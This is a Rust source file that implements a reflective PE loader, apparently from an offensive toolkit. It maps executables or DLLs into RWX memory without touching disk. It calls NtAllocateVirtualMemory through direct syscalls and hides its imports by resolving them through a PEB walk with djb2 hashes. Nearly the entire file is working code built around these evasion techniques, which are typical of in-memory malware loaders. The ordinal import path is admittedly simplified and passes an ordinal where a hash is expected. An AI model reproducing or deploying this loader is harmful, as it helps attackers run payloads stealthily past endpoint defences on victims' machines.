// loader.rs — Reflective PE mapper
//
// Maps a PE (exe or dll) from a byte slice into memory:
//   1. Validate MZ + PE headers
//   2. NtAllocateVirtualMemory at preferred base (or let OS choose)
//   3. Copy headers + sections
//   4. Apply base relocations (delta patch)
//   5. Resolve imports via PEB walk + djb2
//   6. Execute TLS callbacks
//   7. Return mapped base + entry point
//
// No LoadLibrary, no WriteFile, no disk touch.

#![allow(non_snake_case, dead_code)]

use core::{ffi::c_void, mem::size_of, ptr::null_mut};
use crate::defs::*;
use crate::syscall::{do_syscall, resolve_ssn, get_proc_from_peb};
use crate::utils::djb2;

pub struct MappedPE {
    pub base:       *mut u8,
    pub img_size:   u32,
    pub entry_rva:  u32,
}

unsafe impl Send for MappedPE {}
unsafe impl Sync for MappedPE {}

#[repr(C)]
struct ImageOptionalHeader64 {
    Magic:                    u16,
    MajorLinkerVersion:       u8,
    MinorLinkerVersion:       u8,
    SizeOfCode:               u32,
    SizeOfInitializedData:    u32,
    SizeOfUninitializedData:  u32,
    AddressOfEntryPoint:      u32,
    BaseOfCode:               u32,
    ImageBase:                u64,
    SectionAlignment:         u32,
    FileAlignment:            u32,
    _reserved:                [u16; 6],
    SizeOfImage:              u32,
    SizeOfHeaders:            u32,
    CheckSum:                 u32,
    Subsystem:                u16,
    DllCharacteristics:       u16,
    SizeOfStackReserve:       u64,
    SizeOfStackCommit:        u64,
    SizeOfHeapReserve:        u64,
    SizeOfHeapCommit:         u64,
    LoaderFlags:              u32,
    NumberOfRvaAndSizes:      u32,
    DataDirectory:            [[u32; 2]; 16],
}

#[repr(C)]
struct ImageImportDescriptor {
    OriginalFirstThunk: u32,
    TimeDateStamp:      u32,
    ForwarderChain:     u32,
    Name:               u32,
    FirstThunk:         u32,
}

#[repr(C)]
struct ImageBaseRelocation {
    VirtualAddress: u32,
    SizeOfBlock:    u32,
}

#[repr(C)]
struct ImageTlsDirectory64 {
    StartAddressOfRawData:  u64,
    EndAddressOfRawData:    u64,
    AddressOfIndex:         u64,
    AddressOfCallBacks:     u64,
    SizeOfZeroFill:         u32,
    Characteristics:        u32,
}

pub unsafe fn map_pe(data: &[u8]) -> Result<MappedPE, &'static str> {
    if data.len() < 64 { return Err("too small"); }
    // Validate DOS header
    if (data.as_ptr() as *const u16).read_unaligned() != IMAGE_DOS_SIGNATURE {
        return Err("bad MZ");
    }
    let e_lfanew = (data.as_ptr().add(0x3C) as *const u32).read_unaligned() as usize;
    let nt       = data.as_ptr().add(e_lfanew);
    if (nt as *const u32).read_unaligned() != 0x4550 { return Err("bad PE"); }

    let fh       = nt.add(4) as *const IMAGE_FILE_HEADER;
    let opt_off  = e_lfanew + 4 + size_of::<IMAGE_FILE_HEADER>();
    let opt      = data.as_ptr().add(opt_off) as *const ImageOptionalHeader64;

    let img_size  = (*opt).SizeOfImage;
    let pref_base = (*opt).ImageBase as *mut u8;
    let entry_rva = (*opt).AddressOfEntryPoint;
    let hdr_size  = (*opt).SizeOfHeaders as usize;
    let img_base_dd = (*opt).ImageBase;

    // Allocate memory for image
    let alloc_ssn = resolve_ssn("NtAllocateVirtualMemory").unwrap_or(0);
    let mut base: *mut u8 = pref_base;
    let mut sz = img_size as usize;

    let mut st = do_syscall(alloc_ssn,
        (-1isize) as usize,  // current process
        &mut base as *mut _ as usize,
        0,
        &mut sz as *mut _ as usize,
        0x3000,  // MEM_COMMIT | MEM_RESERVE
        PAGE_EXECUTE_READWRITE as usize,
        0);

    if !NT_SUCCESS(st) {
        // Preferred base busy — let OS choose
        base = null_mut();
        sz   = img_size as usize;
        st   = do_syscall(alloc_ssn,
            (-1isize) as usize, &mut base as *mut _ as usize, 0,
            &mut sz as *mut _ as usize, 0x3000,
            PAGE_EXECUTE_READWRITE as usize, 0);
        if !NT_SUCCESS(st) { return Err("alloc failed"); }
    }

    // Copy headers
    core::ptr::copy_nonoverlapping(data.as_ptr(), base, hdr_size);

    // Copy sections
    let n_sect = (*fh).NumberOfSections as usize;
    let opt_sz = (*fh).SizeOfOptionalHeader as usize;
    let sects  = nt.add(4 + size_of::<IMAGE_FILE_HEADER>() + opt_sz)
                   as *const IMAGE_SECTION_HEADER;
    for i in 0..n_sect {
        let s    = &*sects.add(i);
        let raw  = s.PointerToRawData as usize;
        let raw_sz = s.SizeOfRawData as usize;
        let virt = s.VirtualAddress as usize;
        if raw_sz > 0 && raw + raw_sz <= data.len() {
            core::ptr::copy_nonoverlapping(
                data.as_ptr().add(raw),
                base.add(virt),
                raw_sz,
            );
        }
    }

    // Base relocations
    let delta = base as i64 - img_base_dd as i64;
    if delta != 0 {
        let reloc_dd = (*opt).DataDirectory[5]; // IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
        let mut off  = reloc_dd[0] as usize;
        let reloc_end = off + reloc_dd[1] as usize;
        while off < reloc_end {
            let blk = base.add(off) as *const ImageBaseRelocation;
            let va  = (*blk).VirtualAddress as usize;
            let blk_sz = (*blk).SizeOfBlock as usize;
            if blk_sz < 8 { break; }
            let n_entries = (blk_sz - 8) / 2;
            let entries   = base.add(off + 8) as *const u16;
            for i in 0..n_entries {
                let entry = entries.add(i).read_unaligned();
                let typ   = (entry >> 12) as u32;
                let rva   = (entry & 0x0FFF) as usize;
                if typ == 10 { // IMAGE_REL_BASED_DIR64
                    let ptr = base.add(va + rva) as *mut i64;
                    *ptr = ptr.read_unaligned().wrapping_add(delta);
                }
            }
            off += blk_sz;
        }
    }

    // Import resolution
    let import_dd = (*opt).DataDirectory[1]; // IMAGE_DIRECTORY_ENTRY_IMPORT = 1
    let mut imp_off = import_dd[0] as usize;
    if imp_off != 0 {
        loop {
            let desc = base.add(imp_off) as *const ImageImportDescriptor;
            if (*desc).Name == 0 { break; }
            // Hash the module name
            let mod_name = base.add((*desc).Name as usize);
            let mut mh: u32 = 5381;
            let mut j = 0usize;
            loop {
                let b = *mod_name.add(j);
                if b == 0 { break; }
                let lc = if b >= b'A' && b <= b'Z' { b + 32 } else { b };
                mh = mh.wrapping_mul(33).wrapping_add(lc as u32);
                j += 1;
            }
            // Walk thunks
            let mut thunk_off = (*desc).FirstThunk as usize;
            let mut orig_off  = if (*desc).OriginalFirstThunk != 0 {
                (*desc).OriginalFirstThunk as usize
            } else { thunk_off };
            loop {
                let orig_thunk = (base.add(orig_off) as *const u64).read_unaligned();
                if orig_thunk == 0 { break; }
                let fn_addr = if orig_thunk & (1 << 63) != 0 {
                    // Import by ordinal
                    let ord = (orig_thunk & 0xFFFF) as u32;
                    get_proc_from_peb(mh, ord) // simplified — ordinal path
                } else {
                    // Import by name — skip 2-byte hint
                    let name_ptr = base.add(orig_thunk as usize + 2);
                    let mut eh: u32 = 5381;
                    let mut k = 0usize;
                    loop {
                        let b = *name_ptr.add(k);
                        if b == 0 { break; }
                        eh = eh.wrapping_mul(33).wrapping_add(b as u32);
                        k += 1;
                    }
                    get_proc_from_peb(mh, eh)
                };
                if let Some(fp) = fn_addr {
                    let iat_slot = base.add(thunk_off) as *mut u64;
                    *iat_slot = fp as u64;
                }
                thunk_off += 8;
                orig_off  += 8;
            }
            imp_off += size_of::<ImageImportDescriptor>();
        }
    }

    // TLS callbacks
    let tls_dd  = (*opt).DataDirectory[9]; // IMAGE_DIRECTORY_ENTRY_TLS = 9
    if tls_dd[0] != 0 {
        let tls = base.add(tls_dd[0] as usize) as *const ImageTlsDirectory64;
        let mut cb_ptr = (*tls).AddressOfCallBacks as *const *const u8;
        if !cb_ptr.is_null() {
            loop {
                let cb = *cb_ptr;
                if cb.is_null() { break; }
                let tls_cb: unsafe extern "system" fn(*mut c_void, u32, *mut c_void) =
                    core::mem::transmute(cb);
                tls_cb(base as *mut c_void, 1, null_mut()); // DLL_PROCESS_ATTACH
                cb_ptr = cb_ptr.add(1);
            }
        }
    }

    Ok(MappedPE { base, img_size, entry_rva })
}
